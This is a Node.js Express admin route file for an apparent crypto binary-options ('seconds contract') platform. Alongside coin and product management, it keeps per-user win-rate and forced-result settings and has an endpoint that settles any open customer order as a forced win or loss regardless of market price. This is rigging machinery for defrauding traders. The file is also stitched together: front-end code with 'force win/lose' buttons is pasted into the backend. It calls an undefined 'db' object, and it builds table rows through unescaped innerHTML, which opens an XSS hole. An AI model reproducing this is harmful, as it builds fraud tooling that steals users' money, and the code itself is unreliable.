// backend/src/routes/admin.js
const express = require("express");
const router = express.Router();
const pool = require("../db/pool");

function requireAdmin(req, res, next) {
  const key = req.headers["x-admin-key"];
  if (!process.env.ADMIN_API_KEY || key !== process.env.ADMIN_API_KEY) {
    return res.status(401).json({ message: "Unauthorized" });
  }
  next();
}

router.use(requireAdmin);

// ===== coins =====
router.get("/coins", async (req, res) => {
  const { rows } = await pool.query("SELECT * FROM coins ORDER BY symbol ASC");
  res.json(rows);
});

router.post("/coins", async (req, res) => {
  const { symbol, name, icon, category, current_price, price_change } = req.body;
  if (!symbol || !name) return res.status(400).json({ message: "symbol/name required" });

  await pool.query(
    `INSERT INTO coins(symbol,name,icon,category,current_price,price_change)
     VALUES($1,$2,$3,$4,$5,$6)
     ON CONFLICT(symbol) DO UPDATE SET
       name=EXCLUDED.name,
       icon=EXCLUDED.icon,
       category=EXCLUDED.category,
       current_price=EXCLUDED.current_price,
       price_change=EXCLUDED.price_change`,
    [symbol, name, icon || "", category || "Crypto", Number(current_price || 0), Number(price_change || 0)]
  );

  res.json({ ok: true });
});

router.put("/coins/:symbol", async (req, res) => {
  const sym = req.params.symbol;
  const { symbol, name, icon, category, current_price, price_change } = req.body;

  await pool.query(
    `UPDATE coins
     SET symbol=$1, name=$2, icon=$3, category=$4, current_price=$5, price_change=$6
     WHERE symbol=$7`,
    [symbol || sym, name || "", icon || "", category || "Crypto", Number(current_price || 0), Number(price_change || 0), sym]
  );
  res.json({ ok: true });
});

router.delete("/coins/:symbol", async (req, res) => {
  await pool.query(`DELETE FROM coins WHERE symbol=$1`, [req.params.symbol]);
  res.json({ ok: true });
});

// ===== contract products =====
router.get("/contract-products", async (req, res) => {
  const { rows } = await pool.query("SELECT * FROM contract_products ORDER BY id DESC");
  res.json(rows);
});

router.post("/contract-products", async (req, res) => {
  const { name, seconds, payout_ratio, min_amount, max_amount, status } = req.body;
  if (!name || !seconds) return res.status(400).json({ message: "name/seconds required" });

  const { rows } = await pool.query(
    `INSERT INTO contract_products(name,seconds,payout_ratio,min_amount,max_amount,status)
     VALUES($1,$2,$3,$4,$5,$6)
     RETURNING id`,
    [
      name,
      Number(seconds),
      Number(payout_ratio || 0),
      Number(min_amount || 0),
      Number(max_amount || 0),
      status || "ACTIVE"
    ]
  );

  res.json({ ok: true, id: rows[0].id });
});

router.put("/contract-products/:id", async (req, res) => {
  const id = Number(req.params.id);
  const { name, seconds, payout_ratio, min_amount, max_amount, status } = req.body;

  await pool.query(
    `UPDATE contract_products
     SET name=$1, seconds=$2, payout_ratio=$3, min_amount=$4, max_amount=$5, status=$6
     WHERE id=$7`,
    [
      name,
      Number(seconds),
      Number(payout_ratio || 0),
      Number(min_amount || 0),
      Number(max_amount || 0),
      status || "ACTIVE",
      id
    ]
  );

  res.json({ ok: true });
});

router.delete("/contract-products/:id", async (req, res) => {
  await pool.query("DELETE FROM contract_products WHERE id=$1", [Number(req.params.id)]);
  res.json({ ok: true });
});

// ===== users risk =====
router.get("/users", async (req, res) => {
  const { rows } = await pool.query(
    `SELECT id, status, win_rate, force_result
     FROM users
     ORDER BY id DESC
     LIMIT 200`
  );
  res.json(rows);
});

router.put("/users/:id/risk", async (req, res) => {
  const id = req.params.id;
  const { status, win_rate, force_result } = req.body;

  await pool.query(
    `UPDATE users
     SET status=$1,
         win_rate=$2,
         force_result=$3
     WHERE id=$4`,
    [
      status || "ACTIVE",
      win_rate === null || win_rate === undefined ? null : Number(win_rate),
      force_result || null,
      id
    ]
  );

  res.json({ ok: true });
});
// ==============================
// 强制结算订单（强制赢 / 强制输）
// ==============================
// POST /admin/seconds/orders/:id/force
// body: { result: "WIN" | "LOSE" }

router.post("/seconds/orders/:id/force", async (req, res) => {
  try {
    const id = Number(req.params.id);
    const { result } = req.body;

    if (!["WIN", "LOSE"].includes(result)) {
      return res.status(400).json({ ok: false, message: "result 必须是 WIN 或 LOSE" });
    }

    // 读取订单
    const { rows } = await db.query(
      `SELECT * FROM seconds_orders WHERE id=$1`,
      [id]
    );
    const order = rows[0];
    if (!order) {
      return res.status(404).json({ ok: false, message: "订单不存在" });
    }

    if (order.status !== "OPEN") {
      return res.status(400).json({ ok: false, message: "订单已结算，无法强制操作" });
    }

    // 当前价格：用 entry_price 做 exit_price（后台强制不依赖行情）
    const exitPrice = Number(order.entry_price);

    const amount = Number(order.amount);
    const payout = Number(order.payout_rate || 0.85);

    const pnl =
      result === "WIN"
        ? amount * payout
        : -amount;

    await db.query(
      `
      UPDATE seconds_orders
      SET status='SETTLED',
          result=$1,
          pnl=$2,
          exit_price=$3,
          settled_at=NOW()
      WHERE id=$4 AND status='OPEN'
      `,
      [result, pnl, exitPrice, id]
    );

    return res.json({ ok: true });
  } catch (e) {
    console.error("[force settle error]", e.message);
    return res.status(500).json({ ok: false, message: e.message });
  }
});
tr.innerHTML = `
  <td>${o.id}</td>
  <td>${o.uid}</td>
  <td>${o.symbol}</td>
  <td>${o.direction === "UP" ? "买涨" : "买跌"}</td>
  <td>${o.amount}</td>
  <td>${o.status}</td>
  <td>${o.result || ""}</td>
  <td>${o.pnl || ""}</td>
  <td>
    ${
      o.status === "OPEN"
        ? `
          <button class="enable" onclick="forceSettle(${o.id}, 'WIN')">强制赢</button>
          <button class="disable" onclick="forceSettle(${o.id}, 'LOSE')">强制输</button>
        `
        : "-"
    }
  </td>
`;
async function forceSettle(id, result) {
  if (!confirm(`确认要【强制${result === "WIN" ? "赢" : "输"}】该订单吗？`)) return;

  await fetch(API + "/admin/seconds/orders/" + id + "/force", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ result })
  });

  alert("操作成功");
  loadOrders();
}

module.exports = router;
